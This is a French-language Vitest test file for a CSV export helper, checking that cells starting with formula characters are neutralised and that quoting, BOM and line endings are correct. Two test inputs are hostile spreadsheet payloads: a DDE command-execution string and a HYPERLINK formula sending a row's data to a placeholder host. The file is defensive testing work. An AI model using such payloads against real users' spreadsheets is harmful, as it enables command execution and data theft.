import { describe, expect, it } from 'vitest';
import { cellule, fichierCsv, ligneCsv } from '@/lib/csv';

describe('l’injection de formule — le risque principal d’un export', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+33700000000', "'+33700000000"],
    ['-2', "'-2"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\tfoo', "'\tfoo"],
  ])('neutralise une cellule commençant par un caractère de formule : %j', (entree, attendu) => {
    expect(cellule(entree)).toBe(attendu);
  });

  it('neutralise l’attaque DDE classique', () => {
    const attaque = `=cmd|' /C calc'!A1`;
    expect(cellule(attaque).startsWith("'=")).toBe(true);
  });

  it('neutralise HYPERLINK, qui sert à exfiltrer une ligne entière', () => {
    // La cellule contient des guillemets : elle est donc aussi encadrée. Le préfixe
    // se retrouve à l'intérieur des guillemets, ce qui est le comportement correct.
    const r = cellule('=HYPERLINK("https://exemple.test/?d="&A2,"Ouvrir")');
    expect(r.startsWith(`"'=HYPERLINK`)).toBe(true);
    expect(r).not.toMatch(/^=/);
  });

  it('⚠ les guillemets seuls ne protègent pas : le préfixe doit être là même quand la cellule est citée', () => {
    // Une cellule qui déclenche une formule ET contient un point-virgule : les deux
    // traitements doivent s'appliquer, dans cet ordre.
    const r = cellule('=A1;B1');
    expect(r).toBe(`"'=A1;B1"`);
  });

  it('ne touche pas à un nom d’entreprise ordinaire', () => {
    expect(cellule('Ferme avicole Tanguy')).toBe('Ferme avicole Tanguy');
    expect(cellule('Bobo-Dioulasso')).toBe('Bobo-Dioulasso');
  });

  it('ne touche pas à un nombre négatif déjà converti en texte par la base', () => {
    // Attendu et assumé : « -2 » est préfixé. Un montant négatif n'existe pas dans
    // l'export, et la sécurité prime sur l'élégance d'affichage.
    expect(cellule('-2')).toBe("'-2");
  });
});

describe('l’échappement de transport', () => {
  it('double les guillemets et encadre le champ', () => {
    expect(cellule('Il a dit "oui"')).toBe('"Il a dit ""oui"""');
  });

  it('encadre un champ contenant le séparateur', () => {
    expect(cellule('Ouaga; Bobo')).toBe('"Ouaga; Bobo"');
  });

  it('encadre un champ contenant un saut de ligne', () => {
    expect(cellule('ligne 1\nligne 2')).toBe('"ligne 1\nligne 2"');
  });

  it('rend une chaîne vide pour null et undefined', () => {
    expect(cellule(null)).toBe('');
    expect(cellule(undefined)).toBe('');
  });

  it('accepte les nombres et les booléens', () => {
    expect(cellule(450000)).toBe('450000');
    expect(cellule(0)).toBe('0');
    expect(cellule(true)).toBe('true');
  });
});

describe('le fichier complet', () => {
  it('commence par le BOM UTF-8, sans lequel Excel casse les accents', () => {
    expect(fichierCsv(['Entreprise'], [['Ferme']])[0]).toBe('﻿');
  });

  it('sépare les lignes en CRLF, comme l’attend Excel', () => {
    const f = fichierCsv(['a', 'b'], [[1, 2]]);
    expect(f).toBe('﻿a;b\r\n1;2');
  });

  it('applique la neutralisation jusque dans les données', () => {
    expect(fichierCsv(['Entreprise'], [['=1+1']])).toContain("'=1+1");
  });

  it('gère un export sans aucune ligne', () => {
    expect(fichierCsv(['Entreprise', 'Pays'], [])).toBe('﻿Entreprise;Pays');
  });
});

describe('ligneCsv', () => {
  it('joint au point-virgule', () => {
    expect(ligneCsv(['Ferme', 'Burkina Faso', 450000])).toBe('Ferme;Burkina Faso;450000');
  });
});
